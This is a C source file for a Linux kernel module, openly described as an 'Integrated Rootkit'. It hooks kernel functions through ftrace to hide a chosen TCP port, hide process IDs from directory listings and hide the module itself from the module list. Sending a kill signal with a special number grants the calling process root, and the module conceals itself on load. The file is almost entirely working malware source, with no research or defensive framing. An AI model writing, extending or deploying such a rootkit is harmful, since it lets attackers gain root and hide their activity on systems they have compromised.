#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include <linux/seq_file.h>
#include <linux/limits.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/list.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Collaborative Merge");
MODULE_DESCRIPTION("Integrated Rootkit: Dynamic Port, PID Toggle, Stealth & Root");

/* --- Globals --- */
static int port_to_hide = 0; // Default to 0 (none) until set via kill -61
static struct list_head *prev_module;
static short hidden = 0;

struct hidden_pid {
    char pid_str[NAME_MAX];
    struct list_head list;
};

static LIST_HEAD(hidden_pids_list);

/* --- Utility Functions --- */

static struct hidden_pid* find_hidden_pid(const char *name) {
    struct hidden_pid *entry;
    list_for_each_entry(entry, &hidden_pids_list, list) {
        if (strcmp(entry->pid_str, name) == 0) return entry;
    }
    return NULL;
}

static void hideme(void) {
    if (hidden) return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

static void showme(void) {
    if (!hidden) return;
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

static void set_root(void) {
    struct cred *root = prepare_creds();
    if (!root) return;
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;
    commit_creds(root);
}

/* --- Hooks --- */

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    if (v != SEQ_START_TOKEN && v != NULL) {
        struct sock *sk = (struct sock *)v;
        /* If port_to_hide is 0, we don't hide anything */
        if (port_to_hide != 0 && sk->sk_num == port_to_hide) return 0;
    }
    return orig_tcp4_seq_show(seq, v);
}

static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage int hook_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    char buf[NAME_MAX];
    struct hidden_pid *entry, *tmp;

    switch (sig) {
        case 64: /* Grant Root */
            set_root();
            return 0;

        case 63: /* Toggle Module Stealth */
            if (hidden) showme(); else hideme();
            return 0;

        case 62: /* Toggle PID Hiding / Toggle All OFF */
            /* If PID is 0, clear all hidden PIDs (Toggle OFF all) */
            if (pid == 0) {
                list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
                    list_del(&entry->list);
                    kfree(entry);
                }
                pr_info("rootkit: cleared all hidden PIDs\n");
                return 0;
            }

            /* Otherwise, toggle individual PID */
            snprintf(buf, NAME_MAX, "%d", pid);
            struct hidden_pid *existing = find_hidden_pid(buf);
            if (existing) {
                list_del(&existing->list);
                kfree(existing);
            } else {
                struct hidden_pid *new_entry = kmalloc(sizeof(*new_entry), GFP_KERNEL);
                if (new_entry) {
                    snprintf(new_entry->pid_str, NAME_MAX, "%d", pid);
                    list_add(&new_entry->list, &hidden_pids_list);
                }
            }
            return 0;

        case 61: /* Dynamic Port Hiding: Uses the PID argument as the Port Number */
            port_to_hide = (int)pid;
            pr_info("rootkit: now hiding port %d\n", port_to_hide);
            return 0;

        default:
            return orig_kill(regs);
    }
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kdirent, *current_dir, *prev = NULL;
    int ret = orig_getdents64(regs);
    long offset = 0;

    if (ret <= 0 || list_empty(&hidden_pids_list)) return ret;

    kdirent = kvzalloc(ret, GFP_KERNEL);
    if (!kdirent) return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kvfree(kdirent);
        return ret;
    }

    while (offset < ret) {
        current_dir = (void *)kdirent + offset;
        if (find_hidden_pid(current_dir->d_name)) {
            if (current_dir == kdirent) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += current_dir->d_reclen;
        } else {
            prev = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    if (!copy_to_user(dirent, kdirent, ret)) { }
    kvfree(kdirent);
    return ret;
}

/* --- Registration --- */
static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init rootkit_init(void) {
    hideme();
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

static void __exit rootkit_exit(void) {
    struct hidden_pid *entry, *tmp;
    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        list_del(&entry->list);
        kfree(entry);
    }
}

module_init(rootkit_init);
module_exit(rootkit_exit);

